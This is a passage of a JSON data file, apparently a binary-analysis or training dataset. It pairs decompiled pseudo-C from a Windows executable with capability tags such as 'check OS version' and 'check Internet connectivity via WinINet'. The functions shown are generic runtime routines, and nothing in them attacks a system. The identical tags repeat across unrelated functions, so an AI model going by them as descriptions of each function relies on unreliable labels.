*in_FS_OFFSET = arg_8h_00;\n    fcn.00405530(0x40e116);\n    fcn.00405554();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 859
    },
    "0040e27c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e27c(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*0x49791c != NULL) {\n        *(*0x49791c + 3) = 1;\n        (**(**0x49791c + -8))();\n        *0x49791c = NULL;\n    }\n    if (*0x497920 != 0) {\n        *(*0x497920 + 0xc) = 1;\n        fcn.00404650();\n        *0x497920 = 0;\n    }\n    **0x49481c = 0;\n    **0x49496c = 0;\n    **0x494898 = 0;\n    **0x49494c = 0;\n    **0x494978 = 0;\n    **0x494af8 = 0;\n    iVar1 = fcn.00402f84();\n    if (iVar1 != 0) {\n        uVar2 = fcn.00402fa4();\n        fcn.00402f84(uVar2);\n        fcn.0040e1e8();\n    }\n    return;\n}\n",
        "token_count": 254
    },
    "0040e490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e490(uint param_1, int32_t param_2)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0;\n    if ((in_EAX != NULL) && (in_EAX[param_2] != 0)) {\n        if (param_2 == 0) {\n            if ((*((*in_EAX >> 3) + 0x491828) >> (*in_EAX & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n        else {\n            iVar3 = param_2 + -1;\n            while ((-1 < iVar3 && ((*((in_EAX[iVar3] >> 3) + 0x491828) >> (in_EAX[iVar3] & 7) & 1) != 0))) {\n                iVar3 = iVar3 + -1;\n            }\n            uVar1 = param_2 - iVar3 & 0x80000001;\n            if (uVar1 < 0) {\n                uVar1 = (uVar1 - 1 | 0xfffffffe) + 1;\n            }\n            if (uVar1 == 0) {\n                uVar2 = 2;\n            }\n            else if ((*((in_EAX[param_2] >> 3) + 0x491828) >> (in_EAX[param_2] & 7) & 1) != 0) {\n                uVar2 = 1;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 361
    },
    "0040e504": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e504(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4978d4 != '\\0') {\n        fcn.004059dc();\n        uVar1 = fcn.0040e490();\n    }\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0040e528": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0040e528(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*0x4978d4 != '\\0') {\n        uVar1 = fcn.0040e490();\n    }\n    return uVar1;\n}\n",
        "token_count": 63
    },
    "0040e750": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040e750(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*0x4978d4 != '\\0') {\n        iVar1 = sub.user32.dll_CharNextA_1();\n        return iVar1 - in_EAX;\n    }\n    return 1;\n}\n",
        "token_count": 75
    },
    "0040e778": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040e778(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 1;\n    if ((*0x4978d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x491828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        uVar1 = fcn.0040e750();\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "0040e7b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e7b0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = param_2 + 1;\n    if ((*0x4978d4 != '\\0') && (uVar2 = *(in_EAX + -1 + param_2),  (*((uVar2 >> 3) + 0x491828) >> (uVar2 & 7) & 1) != 0)\n       ) {\n        fcn.004059dc();\n        iVar1 = fcn.0040e750();\n        iVar1 = iVar1 + param_2;\n    }\n    return iVar1;\n}\n",
        "token_count": 169
    },
    "0040e998": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040e998(uint param_1, char *param_2)\n\n{\n    uint8_t uVar1;\n    char *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack24;\n    uint32_t uStack20;\n    \n    iVar4 = 0;\n    if ((((in_EAX != NULL) && (*in_EAX != '\\0')) && (param_2 != NULL)) && (*param_2 != '\\0')) {\n        iStack24 = fcn.0040a868();\n        uVar2 = fcn.0040a868();\n        iVar4 = fcn.0040aa54();\n        while ((iVar4 != 0 && (uVar2 <= iStack24 - (iVar4 - in_EAX)))) {\n            uVar1 = fcn.0040e528();\n            uStack20 = uStack20 & 0xffffff00 | uVar1;\n            if (uVar1 != 2) {\n                iStack24 = 0x400;\n                iVar3 = sub.kernel32.dll_CompareStringA_1();\n                if (iVar3 == 2) goto code_r0x0040ea2e;\n            }\n            iVar4 = fcn.0040aa54();\n        }\n        iVar4 = 0;\n    }\ncode_r0x0040ea2e:\n    return CONCAT44(uStack20, iVar4);\n}\n",
        "token_count": 319
    },
    "0040ebcc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0040ebcc(void)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint *in_FS_OFFSET;\n    uint *var_40h;\n    uint *var_3ch;\n    uint *var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = &stack0xfffffffc;\n    iVar1 = 8;\n    do {\n        var_4h = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    var_14h = 0x40ee97;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0040ebcc::var_18h;\n    var_1ch = 0x40ebef;\n    var_ch = unaff_EBX;\n    fcn.0040eb08();\n    var_1ch = 0x40ebf4;\n    fcn.0040d3e8();\n    if (*0x4978d4 != '\\0') {\n        var_1ch = 0x40ec02;\n        fcn.0040d5c0();\n    }\n    var_1ch = 0x40ec07;\n    sub.kernel32.dll_GetThreadLocale_1();\n    var_1ch = &fcn.0040ebcc::var_10h;\n    var_20h = 0x40ec1b;\n    fcn.0040d334(var_1ch);\n    var_20h = 0x40ec28;\n    fcn.00405584();\n    var_20h = &fcn.0040ebcc::var_14h;\n    var_24h = 0x40ec3d;\n    fcn.0040d334(var_20h);\n    var_24h = 0x40ec47;\n    *0x49780c = fcn.00409f18();\n    var_24h = &fcn.0040ebcc::var_18h;\n    var_28h = 0x40ec61;\n    fcn.0040d334(var_24h);\n    var_28h = 0x40ec6b;\n    *0x49780d = fcn.00409f18();\n    var_28h = 0x40ec7e;\n    *0x49780e = fcn.0040d380();\n    var_28h = 0x40ec91;\n    *0x49780f = fcn.0040d380();\n    var_28h = &fcn.0040ebcc::var_1ch;\n    var_2ch = 0x40ecab;\n    fcn.0040d334(var_28h);\n    var_2ch = 0x40ecb5;\n    *0x497810 = fcn.00409f18();\n    var_2ch = 0x40ecc8;\n    *0x497811 = fcn.0040d380();\n    var_2ch = &fcn.0040ebcc::var_24h;\n    var_30h = 0x40ece2;\n    fcn.0040d334(var_2ch);\n    var_30h = 0x40eced;\n    fcn.0040d670();\n    var_30h = 0x40ecfa;\n    fcn.00405584();\n    var_30h = &fcn.0040ebcc::var_2ch;\n    var_34h = 0x40ed0f;\n    fcn.0040d334(var_30h);\n    var_34h = 0x40ed1a;\n    fcn.0040d670();\n    var_34h = 0x40ed27;\n    fcn.00405584();\n    var_34h = 0x40ed35;\n    *0x49781c = fcn.0040d380();\n    var_34h = &fcn.0040ebcc::var_30h;\n    var_38h = 0x40ed4f;\n    fcn.0040d334(var_34h);\n    var_38h = 0x40ed5c;\n    fcn.00405584();\n    var_38h = &fcn.0040ebcc::var_34h;\n    var_3ch = 0x40ed71;\n    fcn.0040d334(var_38h);\n    var_3ch = 0x40ed7e;\n    fcn.00405584();\n    var_3ch = 0x40ed86;\n    fcn.00405530();\n    var_3ch = 0x40ed8e;\n    fcn.00405530();\n    var_3ch = &fcn.0040ebcc::var_38h;\n    var_40h = 0x40eda3;\n    fcn.0040d334(var_3ch);\n    var_40h = 0x40edad;\n    iVar1 = fcn.00409f18();\n    if (iVar1 == 0) {\n        var_40h = 0x40edbe;\n        fcn.004055c8();\n    }\n    else {\n        var_40h = 0x40edcd;\n        fcn.004055c8();\n    }\n    var_40h = &fcn.0040ebcc::var_3ch;\n    fcn.0040d334(var_40h);\n    iVar1 = fcn.00409f18();\n    if (iVar1 == 0) {\n        fcn.0040d334(&fcn.0040ebcc::var_40h);\n        iVar1 = fcn.00409f18();\n        if (iVar1 == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n    }\n    fcn.004058e0(var_ch, 0x40ef30, var_4h, var_8h);\n    fcn.004058e0(var_ch, 0x40ef3c, var_4h, var_8h);\n    *0x4978d6 = fcn.0040d380();\n    *in_FS_OFFSET = var_ch;\n    fcn.00405554(0x40ee9e);\n    return;\n}\n",
        "token_count": 1661
    },
    "0040f0f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0040f0f4(void)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    \n    uVar1 = 0;\n    while( true ) {\n        uVar2 = uVar1 << 5 | uVar1 >> 0x1b;\n        uVar3 = *in_EAX;\n        if (uVar3 == 0) break;\n        if (('@' < uVar3) && (uVar3 < '[')) {\n            uVar3 = uVar3 | 0x20;\n        }\n        uVar1 = uVar1 << 5 & 0xffffff00 | uVar2 ^ uVar3;\n        in_EAX = in_EAX + 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 189
    },
    "0040f340": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f340(void)\n\n{\n    while( true ) {\n        if (*0x491a20 == NULL) break;\n        *0x491a20 = **0x491a20;\n        fcn.00402f1c();\n    }\n    return;\n}\n",
        "token_count": 62
    },
    "0040f3a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f3a4(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x494950 == 0) {\n        iVar3 = 0;\n        for (puVar1 = **0x494c10; puVar1 != NULL; puVar1 = *puVar1) {\n            sub.kernel32.dll_FindResourceA(puVar1[1], 0x40f414, 10);\n            iVar3 = sub.kernel32.dll_LoadResource();\n            if (iVar3 != 0) {\n                return iVar3;\n            }\n        }\n    }\n    else {\n        uVar2 = sub.kernel32.dll_FindResourceA(**0x494950, 0x40f414, 10);\n        iVar3 = sub.kernel32.dll_LoadResource(**0x494950, uVar2);\n    }\n    return iVar3;\n}\n",
        "token_count": 202
    },
    "0040f41c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040f41c(uint32_t param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = 0x40f426;\n    iVar2 = fcn.0040f3a4(param_1);\n    iVar3 = *0x491a30;\n    if (iVar2 != 0) {\n        iVar3 = fcn.0040f364();\n        iVar4 = fcn.0040f374();\n        if ((((iVar3 == *0x491a24) && (iVar4 == *0x491a34)) || ((iVar3 == *0x491a28 && (iVar4 == *0x491a38)))) ||\n           ((iVar3 == *0x491a2c && (iVar4 == *0x491a3c)))) {\n            uVar1 = 1;\n        }\n        else {\n            uVar1 = 0;\n        }\n        sub.kernel32.dll_FreeResource(iVar2, param_1 & 0xffffff00 | uVar1);\n        iVar4 = iVar2;\n        if (iVar2 == '\\0') {\n            fcn.0040f38c();\n            iVar4 = iVar2;\n        }\n    }\n    return CONCAT44(iVar4, iVar3);\n}\n",
        "token_count": 295
    },
    "0040f4ac": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040f4ac(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_GetModuleHandleA_2(0x40f4e4);\n    if (iVar1 != 0) {\n        *0x49184c = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x40f4f4);\n    }\n    if (*0x49184c == NULL) {\n        *0x49184c = fcn.0040a748;\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "0040fa94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040fa94(void)\n\n{\n    uint *puVar1;\n    \n    for (puVar1 = **0x494c10; puVar1 != NULL; puVar1 = *puVar1) {\n        if (puVar1[5] != 0) {\n            fcn.0040641c();\n            puVar1[5] = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004104c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004104c4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EDX;\n    \n    iVar1 = in_EDX;\n    if (*(arg_8h + -4) != 0) {\n        iVar1 = sub.kernel32.dll_GetProcAddress_1(*(arg_8h + -4));\n        if (iVar1 == 0) {\n            iVar1 = in_EDX;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 111
    },
    "00411d34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411d34(uint32_t param_1, uint16_t *param_2)\n\n{\n    float10 fVar1;\n    ulong uVar2;\n    \n    if (param_1 != *param_2) {\n        if (*param_2 == 0x400c) {\n            fcn.00411d34();\n        }\n        else {\n    // switch table (21 cases) at 0x411d79\n            switch(param_1) {\n            case 0:\n                if ((*param_2 == 1) && (*0x491a5c != '\\0')) {\n                    fcn.00410e58();\n                }\n                else {\n                    fcn.0041163c();\n                }\n                break;\n            case 1:\n                fcn.004113a4();\n                break;\n            case 2:\n                fcn.004126a4();\n                fcn.00415984();\n                break;\n            case 3:\n                fcn.004120f8();\n                fcn.004158e4();\n                break;\n            case 4:\n                fVar1 = fcn.00413a4c();\n                fcn.004159d0(fVar1);\n                break;\n            case 5:\n                fVar1 = fcn.004136d4();\n                fcn.004159f4(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 6:\n                fVar1 = fcn.0041438c();\n                fcn.00415a20(ROUND(fVar1), ROUND(fVar1) >> 0x20);\n                break;\n            case 7:\n                fVar1 = fcn.00413e24();\n                fcn.00415a4c(SUB84(fVar1, 0), fVar1 >> 0x20);\n                break;\n            case 8:\n                fcn.00411b18();\n                break;\n            case 9:\n                fcn.00411bb0();\n                break;\n            default:\n                if (param_1 == 0x100) {\n                    fcn.00411b64();\n                }\n                else if (param_1 == 0x101) {\n                    fcn.00410e58();\n                }\n                else {\n                    fcn.00411cc8();\n                }\n                break;\n            case 0xb:\n                fcn.004131c0();\n                fcn.00415a78();\n                break;\n            case 0xd:\n                fcn.00411bfc();\n                break;\n            case 0x10:\n                fcn.00412548();\n                fcn.00415964();\n                break;\n            case 0x11:\n                fcn.004125fc();\n                fcn.00415904();\n                break;\n            case 0x12:\n                fcn.0041279c();\n                fcn.00415924();\n                break;\n            case 0x13:\n                fcn.00412878();\n                fcn.00415944();\n                break;\n            case 0x14:\n                uVar2 = fcn.00412bc8();\n                fcn.004159a4(uVar2, uVar2 >> 0x20);\n            }\n        }\n        return;\n    }\n    fcn.00411a68();\n    return;\n}\n",
        "token_count": 722
    },
    "004120f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004120f8(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x412519;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *in_EAX;\n    // switch table (21 cases) at 0x41212b\n    switch(uVar1) {\n    case 0:\n        var_8h = 0;\n        break;\n    case 1:\n        if (*0x491a5c != '\\0') {\n            puStack28 = &stack0xfffffffc;\n            fcn.00410e58();\n        }\n        var_8h = 0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 5:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 6:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 7:\n        puStack28 = &stack0xfffffffc;\n        uVar3 = fcn.00403450();\n        var_8h = uVar3;\n        if (var_8h >> 0x1f != uVar3 >> 0x20) {\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 8:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00411f60();\n        break;\n    case 9:\n    case 0xd:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.00412014();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00411f60();\n        }\n        else if (uVar1 == 0x101) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00412050();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            puStack28 = &stack0xfffffffc;\n            cVar2 = fcn.004120b4();\n            if (cVar2 == '\\0') {\n                var_8h = fcn.00412014();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x41234f\n            switch(uVar1 & 0xbfff) {\n            default:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00412014();\n                break;\n            case 2:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 3:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 4:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 5:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 6:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 7:\n                puStack28 = &stack0xfffffffc;\n                uVar3 = fcn.00403450();\n                var_8h = uVar3;\n                if (var_8h >> 0x1f != uVar3 >> 0x20) {\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 8:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.00411f60();\n                break;\n            case 0xb:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0xc:\n                puStack28 = &stack0xfffffffc;\n                var_8h = fcn.004120f8();\n                break;\n            case 0x10:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x11:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x12:\n                var_8h = **(in_EAX + 4);\n                break;\n            case 0x13:\n                var_8h = **(in_EAX + 4);\n                if (var_8h < 0) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n                break;\n            case 0x14:\n                var_8h = **(in_EAX + 4);\n                if (var_8h >> 0x1f != (*(in_EAX + 4))[1]) {\n                    puStack28 = &stack0xfffffffc;\n                    var_8h = fcn.00404518();\n                }\n            }\n        }\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0xc:\n        puStack28 = &stack0xfffffffc;\n        var_8h = fcn.004120f8();\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        if (var_8h < 0) {\n            puStack28 = &stack0xfffffffc;\n            var_8h = fcn.00404518();\n        }\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n        if (var_8h >> 0x1f != *(in_EAX + 6)) {\n            var_8h = fcn.00404518();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    return var_8h;\n}\n",
        "token_count": 1821
    },
    "00412548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00412548(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x491a5c != '\\0') {\n            puStack24 = 0x412588;\n            fcn.00410e58();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x10) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x4125d6;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120f8();\n        if (0xff < uVar2 + 0x80) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 320
    },
    "004125fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.004125fc(void)\n\n{\n    int16_t iVar1;\n    int16_t *in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar1 = *in_EAX;\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else if (iVar1 == 1) {\n        if (*0x491a5c != '\\0') {\n            puStack24 = 0x41263c;\n            fcn.00410e58();\n        }\n        uVar2 = 0;\n    }\n    else if (iVar1 == 0xb) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else if (iVar1 == 0x11) {\n        uVar2 = *(in_EAX + 4);\n    }\n    else {\n        uStack28 = 0x412681;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        uVar2 = fcn.004120f8();\n        if (0xff < uVar2) {\n            fcn.00404518();\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return uVar2;\n}\n",
        "token_count": 314
    },
    "004126a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
